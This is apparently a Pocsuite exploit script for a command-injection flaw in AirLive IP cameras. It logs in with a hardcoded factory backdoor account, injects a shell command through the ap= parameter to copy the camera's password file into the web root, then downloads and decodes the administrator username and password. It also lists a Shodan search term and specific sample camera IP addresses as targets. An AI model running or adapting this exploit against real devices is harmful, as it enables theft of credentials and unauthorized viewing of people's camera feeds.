#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import base64


class TestPOC(POCBase):
    vulID = '89239'  # ssvid
    version = '1.0'
    author = ['sebao']
    vulDate = ''
    createDate = '2017-07-07'
    updateDate = '2017-07-07'
    references = ['']
    name = 'AirLive 系列 IP 摄像头命令注入漏洞'
    appPowerLink = ''
    appName = 'AirLive'
    appVersion = 'TBU-2015,BU-3026,MD-3025,WL-2000CAM，POE-200CAM v2'
    vulType = 'command exec'
    desc = '''
        AirLive 系列 IP 摄像头命令注入漏洞, 存在一个manufacture用户, 密码为erutcafunam, 可访问/cgi-bin/mft/wireless_mft?ap= 执行任意命令, 可获取管理员密码, 登录后台直接查看摄像头
    '''
    shodandork = 'netcam'
    samples = ['http://190.189.129.96/',
               'http://77.247.226.104/']
    install_requires = ['re', 'hashlib']

    # 请尽量不要使用第三方库，必要时参考 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md#poc-第三方模块依赖说明 填写该字段

    def _attack(self):
        return self._verify(self)

    def _verify(self):
        result = {}
        if self.url.endswith('/'):
            self.url = self.url[:-1]
        auth = ('manufacture', 'erutcafunam')
        vul_url = self.url + '/cgi-bin/mft/wireless_mft?ap=testname;cp%20/var/www/secret.passwd%20/web/html/credentials'
        verify_url = self.url + '/credentials'

        r = req.get(vul_url, auth=auth)

        if r.status_code == 200:
            r2 = req.get(verify_url, auth=auth)
            if r2.status_code == 200 and '000007ff' in r2.content:
                recon = r2.content.split(' ')
                info = base64.b64decode(recon[1])
                user = info.split(':')[0]
                passwd = info.split(':')[1]
                result['VerifyInfo'] = {}
                result['VerifyInfo']['username'] = user
                result['VerifyInfo']['password'] = passwd
            return self.parse_output(result)

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

